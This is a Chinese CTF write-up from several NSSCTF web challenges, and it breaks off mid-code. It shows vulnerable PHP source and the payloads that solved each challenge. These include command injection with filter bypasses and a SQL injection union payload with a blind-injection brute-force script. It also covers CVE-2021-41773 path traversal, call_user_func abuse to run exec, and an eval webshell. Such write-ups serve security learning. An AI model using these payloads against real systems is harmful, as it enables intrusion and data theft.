<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strCheck</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i"</span>, <span class="hljs-variable">$cmd</span>)){<br>        <span class="hljs-keyword">return</span>(<span class="hljs-variable">$cmd</span>);<br>    }<br>    <span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"i hate this"</span>);      <br>      }<br>}<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>];<br><span class="hljs-title function_ invoke__">strCheck</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>无回显RCE，幸运地是没禁用tee，直接配合ls将内容重定向到文件即可：<code>cmd=cat /f*| tee 1.txt</code></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311203334975.png" alt="image-20240311203334975"></p>
<h1>[SWPUCTF 2023 秋季新生赛]Pingpingping</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_ping</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'Ping_ip.exe'</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_ping</span>)){<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">"ping -c 3 "</span>.<span class="hljs-variable">$_ping</span>);<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">"error.png"</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/png;base64,<span class="hljs-subst">$data</span>'/&gt;"</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>简单的命令执行，不过注意参数的传参即可：<code>?Ping[ip.exe=1 | cat /flag</code></p>
<h1>[NSSCTF 2022 Spring Recruit]babysql</h1>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">hacker!!black_list is /if|and|\s|#|--/<span class="hljs-selector-tag">i</span><br></code></pre></td></tr></tbody></table></figure>
<p>过滤了空格和注释符，那/**/代替空格，单引号闭合后面的单引号即可</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">username=-<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span>(select/**/group_concat(flag)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>flag)'<br></code></pre></td></tr></tbody></table></figure>
<p><img src="C:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240311220803921.png" alt="image-20240311220803921"></p>
<p>由于输入上述payload，页面回显有flag字样。因此也可以盲注进行</p>
<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>strings = <span class="hljs-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\",#$&amp;'()*+-./:;&lt;=&gt;?@[\]^_`{|}~"</span><br>pwd = <span class="hljs-string">''</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings:<br>        data = {<span class="hljs-string">"username"</span>: <span class="hljs-string">f"tarnisha'/**/or/**/database()/**/like/**/'<span class="hljs-subst">{pwd+i}</span>%"</span>}<br>        response = requests.post(<span class="hljs-string">"http://node2.anna.nssctf.cn:28793/"</span>, data=data)<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">"flag"</span> <span class="hljs-keyword">in</span> response.text:<br>            pwd += i<br>            <span class="hljs-built_in">print</span>(pwd)<br>            flag = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></tbody></table></figure>
<h1>[GFCTF 2021]Baby_Web</h1>
<p>这里也是遗忘这个知识点了，不知道如何进行目录穿越：</p>
<p>利用漏洞为：CVE-2021-41773\CVE-2021-42013，具体可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/131710556?spm=1001.2014.3001.5501">CVE-2021-41773 漏洞复现</a></p>
<p>这里我的dirsearch也扫出来过这个漏洞，但我直接在URL上发送就不可，必须用bp（不理解）</p>
<p>这里提醒着我，在扫目录的时候出现了cgi-bin就应该联想到目录穿越</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312173603813.png" alt="image-20240312173603813"></p>
<p>验证成功，接下来就是读取源码了，他提示源码在上层目录的xxx.php.txt，猜测xxx为index</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312174103182.png" alt="image-20240312174103182"></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;h1&gt;Welcome To GFCTF <span class="hljs-number">12</span>th!!&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">"main"</span>,<span class="hljs-string">"main"</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">"Class.php"</span>;<br><span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Temp</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-variable">$temp</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>]);<br><br><span class="hljs-meta">?&gt;</span><br>&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;<br></code></pre></td></tr></tbody></table></figure>
<p>读取Class.php，刚开始只输入Class.php竟然读取不到，联想之前，我尝试添加txt成功了</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">'main'</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"no!!"</span>);<br>Class Temp{<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$date</span>=[<span class="hljs-string">'version'</span>=&gt;<span class="hljs-string">'1.0'</span>,<span class="hljs-string">'img'</span>=&gt;<span class="hljs-string">'https://www.apache.org/img/asf-estd-1999-logo.jpg'</span>];<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$template</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>{<br><br>        <span class="hljs-variable language_">$this</span>-&gt;date = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;date,<span class="hljs-variable">$data</span>);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">'admin'</span>){<br>            <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'..'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'./template/admin/'</span>.<span class="hljs-variable">$template</span>);<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$this</span>-&gt;template)){<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">"no!!"</span>);<br>            }<br>        }<br>        <span class="hljs-keyword">else</span>{<br>            <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-string">'./template/index.html'</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>=<span class="hljs-string">''</span></span>)</span>{<br><br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$this</span>-&gt;date);<span class="hljs-comment">//将键值当做变量，值当做变量的值</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getTempName</span>(<span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>);<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;template);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listdata</span>(<span class="hljs-params"><span class="hljs-variable">$_params</span></span>)</span>{<br>        <span class="hljs-variable">$system</span> = [<br>            <span class="hljs-string">'db'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'app'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'num'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'sum'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'form'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'page'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'site'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'flag'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'not_flag'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'show_flag'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'more'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'catid'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'field'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'order'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'space'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'table'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'table_site'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'total'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'join'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'on'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'action'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'return'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'sbpage'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'module'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'urlrule'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'pagesize'</span> =&gt; <span class="hljs-string">''</span>,<br>            <span class="hljs-string">'pagefile'</span> =&gt; <span class="hljs-string">''</span>,<br>        ];<br><br>        <span class="hljs-variable">$param</span> = <span class="hljs-variable">$where</span> = [];<br><br>        <span class="hljs-variable">$_params</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_params</span>); <span class="hljs-comment">//主要去除字符串收尾空格符</span><br><br>        <span class="hljs-variable">$params</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">' '</span>, <span class="hljs-variable">$_params</span>); <span class="hljs-comment">//按照空格将字符串分割为数组</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>], [<span class="hljs-string">'list'</span>,<span class="hljs-string">'function'</span>])) { <span class="hljs-comment">//看数组是否存在后面数组的指定值</span><br>            <span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">'action='</span>.<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>];<br>        }<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$t</span>) {<br>            <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$t</span>, <span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$t</span>, <span class="hljs-string">'='</span>));<span class="hljs-comment">//找寻=符号第一次出现的位置：0-》位置</span><br>            <span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$t</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$t</span>, <span class="hljs-string">'='</span>) + <span class="hljs-number">1</span>);<span class="hljs-comment">//位置+1以后得（不包括位置+1）</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$var</span>) {<span class="hljs-comment">//action=action=function  //var=action，val=function</span><br>                <span class="hljs-keyword">continue</span>;<br>            }<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>])) { <br>                <span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;<span class="hljs-comment">//action=》function；</span><br>            } <span class="hljs-keyword">else</span> {<br>                <span class="hljs-variable">$param</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>; <span class="hljs-comment">//action=》function</span><br>            }<br>        }<br>        <span class="hljs-comment">// action</span><br>        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">'action'</span>]) {<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">'function'</span>:<br><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">'name'</span>])) { <span class="hljs-comment">//name键值的值必须存在且为已经定义的函数</span><br>                    <span class="hljs-keyword">return</span>  <span class="hljs-string">'hacker!!'</span>;<br>                } <span class="hljs-keyword">elseif</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">'name'</span>])) {<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">'hacker!!'</span>;<br>                }<br><br>                <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">'force'</span>];<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) {<br>                    <span class="hljs-variable">$p</span> = [];<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) {<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$var</span>, <span class="hljs-string">'param'</span>) === <span class="hljs-number">0</span>) {<span class="hljs-comment">//返回param在var中首次出现的位置</span><br>                            <span class="hljs-variable">$n</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));<br>                            <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;<br>                        }<br>                    }<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) {<br><br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">'name'</span>], <span class="hljs-variable">$p</span>);<br>                    } <span class="hljs-keyword">else</span> {<br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">'name'</span>]);<br>                    }<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;<br>                }<span class="hljs-keyword">else</span>{<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                }<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">'list'</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;date);<br>        }<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>另外还有/template/admin/下的部分源码：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;!--&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>="&lt;?php echo <span class="hljs-variable">$img</span>;?&gt;"&gt;--&gt;<br>&lt;<span class="hljs-selector-tag">div</span>&gt;&lt;?php echo <span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">listdata</span>("action=list module=$mod");?&gt;&lt;<span class="hljs-selector-tag">div</span>&gt;<span class="hljs-comment">//module=action=function</span><br>    &lt;<span class="hljs-selector-tag">h6</span>&gt;version: &lt;?php echo <span class="hljs-variable">$version</span>;?&gt;&lt;/<span class="hljs-selector-tag">h6</span>&gt;<br></code></pre></td></tr></tbody></table></figure>
<p>action=list、module=$mod</p>
<p>这道题代码审计审的我很累（因为太菜），最后还是陷入了一个小误区，还是无奈看了wp：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/131716989?spm=1001.2014.3001.5501">[GFCTF 2021]Baby_Web(CVE-2021-41773) 从一道题入门PHP代码审计</a>–很详细</p>
<p>这里我审计的时候，思路都理顺了，就是最终传payload陷入误区了。</p>
<p>总的来说，就是需要在filename传值中，要使其合理化，使得/template/admin/filename为一个合法文件</p>
<p>当然这里尝试几次就知道index.html即可</p>
<p>随后我们就能将上述<code>$this-&gt;listdata("action=list module=$mod")</code>所在文件包含进去，而包含进去的目的就是为了调用最终的<code>call_user_func_array</code>或<code>call_user_func</code>函数，最终RCE</p>
<p>而其中我在传参数的时候，我以为param数组中的action=function的action是个键值，所以弄得我始终没成功，看了wp思考了一会儿发现应该会有数字索引的，也就是比如：0=》“action=function”这样理解的话，那<code>system['action']=function</code>就成立了。具体不再详述，上述文章很详细。</p>
<p>这里需要注意最终的命令执行函数还被禁了很多，但是无回显函数exec没禁用，那直接将输出重定向读取即可，当然还需要注意这里的空格（用合理字符代替）</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">space=admin&amp;mod=hybcx action=function name=exec param0a=cat${IFS}/f11111111aaaagggg&gt;/<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span>/<span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312191657763.png" alt="image-20240312191657763"></p>
<p>这里看了wp还有方法二，当时分析也没想着利用<code>call_user_func</code>函数，因为那里只有一个参数，我没深度思考是否能利用，但这里看了wp发现，直接传入phpinfo函数（这个函数不需要参数）而flag也恰好在其中</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">space=admin&amp;mod=hybcx action=function name=phpinfo<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312192658066.png" alt="image-20240312192658066"></p>
<h1>[SWPUCTF 2023 秋季新生赛]一键连接!</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$md5_1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'md5_1'</span>];<br><span class="hljs-variable">$md5_2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'md5_2'</span>];<br><span class="hljs-variable">$sha1_1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'sha1_1'</span>];<br><span class="hljs-variable">$sha1_2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'sha1_2'</span>];<br><span class="hljs-variable">$new_player</span> =<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'new_player'</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5_1</span> !== <span class="hljs-variable">$md5_2</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5_1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5_2</span>)) {<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$sha1_1</span> != <span class="hljs-variable">$sha1_2</span> &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$sha1_1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$sha1_2</span>)) {<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$new_player</span>) === <span class="hljs-string">"Welcome to NSSCTF!!!"</span>) {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Congratulations~~~~~~~~~"</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"试试need Antsword&lt;br/&gt;"</span>;<br>            @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'Nss'</span>]);<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"可曾听过data协议?"</span>;<br>        }<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"sha1又如何相等呢"</span>;<br>    }<br>} <span class="hljs-keyword">else</span> {<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"如何让md5值相等呢¿"</span>;<br>}<br>如何让md5值相等呢¿<br></code></pre></td></tr></tbody></table></figure>
<p>思路很简单，数组绕过，伪协议绕过file_get_contents，最后webshell</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312193713044.png" alt="image-20240312193713044"></p>
<h1>[SWPUCTF 2022 新生赛]file_master</h1>
<p>这题某个知识点也是第一次见</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312211623343.png" alt="image-20240312211623343"></p>
<p>来到首页，这里我对查看文件功能没做尝试，后面看wp发现这个可以用来查看源码进一步分析，直接抓包输入index.php即可，这里我直接放上源码</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>])){<br>        <span 